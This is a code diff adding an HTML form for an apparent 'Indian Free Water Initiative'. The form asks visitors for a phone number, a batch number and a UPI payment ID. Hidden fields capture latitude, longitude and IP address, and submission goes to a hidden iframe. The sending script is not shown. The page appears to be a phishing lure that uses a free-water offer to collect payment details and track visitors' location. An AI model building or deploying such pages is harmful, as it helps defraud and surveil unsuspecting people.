@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Indian Free Water Initiative</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Indian Free Water Initiative</h1>
+        <p class="subtitle">Water Information Collection Form</p>
+        
+        <form id="waterForm" onsubmit="handleSubmit(event)" target="hidden_iframe">
+            <iframe name="hidden_iframe" style="display:none;"></iframe>
+            <div class="form-group">
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" name="phone" pattern="[0-9]{10}" required placeholder="Enter 10-digit phone number">
+            </div>
+
+            <div class="form-group">
+                <label for="batch">Batch Number</label>
+                <input type="text" id="batch" name="batch" required placeholder="Enter batch number">
+            </div>
+
+            <div class="form-group">
+                <label for="upi">UPI ID</label>
+                <input type="text" id="upi" name="upi" required placeholder="Enter UPI ID">
+            </div>
+
+            <div class="form-group">
+                <label for="location">Location</label>
+                <input type="text" id="location" name="location" readonly>
+                <input type="hidden" id="latitude" name="latitude">
+                <input type="hidden" id="longitude" name="longitude">
+                <input type="hidden" id="ipAddress" name="ipAddress">
+            </div>
+
+            <button type="submit" class="submit-btn">Submit</button>
+        </form>
+
+        <div id="status" class="status-message"></div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
